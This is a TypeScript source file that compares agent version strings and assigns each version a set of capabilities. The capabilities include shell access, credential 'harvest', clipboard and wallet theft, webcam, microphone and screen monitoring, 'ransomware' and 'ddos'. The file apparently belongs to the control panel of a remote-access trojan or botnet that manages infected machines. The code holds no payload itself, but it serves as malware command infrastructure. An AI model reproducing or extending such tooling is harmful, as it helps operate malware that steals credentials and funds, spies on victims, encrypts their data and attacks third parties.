/**
 * One compatibility map for agents. 0.3.8 was built locally from an older tree
 * and is numerically newer than 0.3.7, so it is normalised before comparing.
 * Feature gating will move to capabilities in the v2 gate; until then this is
 * the only place allowed to know legacy versions.
 */
const LEGACY: Record<string, string> = { '0.3.8': '0.3.6.99' };

export function legacyLevel(version: string | null | undefined): string {
  return LEGACY[version ?? ''] ?? (version || '0.0.0');
}

export function compareVersion(value: string | null | undefined, minimum: string): number {
  const parse = (input: string) => input.split('.').map((part) => Number.parseInt(part, 10) || 0);
  const left = parse(legacyLevel(value));
  const right = parse(minimum);
  for (let index = 0; index < Math.max(left.length, right.length); index += 1) {
    const diff = (left[index] ?? 0) - (right[index] ?? 0);
    if (diff !== 0) return diff;
  }
  return 0;
}

export function versionAtLeast(value: string | null | undefined, minimum: string): boolean {
  return compareVersion(value, minimum) >= 0;
}

/** Capabilities implied by legacy versions until agents declare their own. */
export function capabilitiesFor(version: string | null | undefined): Set<string> {
  const out = new Set<string>(['shell', 'files', 'screenshot', 'harvest', 'clipboard', 'wallets']);
  if (versionAtLeast(version, '0.3.7')) {
    for (const name of ['monitor', 'webcam', 'mic', 'ransomware', 'ddos']) out.add(name);
  }
  return out;
}
